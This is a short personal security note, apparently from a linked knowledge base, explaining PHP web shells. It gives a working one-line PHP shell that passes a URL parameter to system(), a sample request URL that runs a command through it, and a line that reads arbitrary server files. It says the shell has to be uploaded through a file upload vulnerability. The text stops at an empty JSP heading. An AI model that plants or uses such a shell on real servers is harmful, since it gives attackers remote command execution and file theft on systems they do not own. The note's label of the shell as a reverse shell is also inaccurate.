---
tags:
  - security
  - web
---
A file that can be executed to achieve [[Reverse Shell]] capabilties through [[Rest API|HTTP Request]].
Must be uploaded as a file first via file upload vulnerabilities.
# PHP Webshell
File extensions:
- `.php`
- `.php5`
- `.shtml`
```
<?php echo system($_GET['command']); ?>
```
Then you can send any command:
```
http://mysite/phpshell.php?command=ls
```
Alternatively to read specific file:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
# JSP Webshell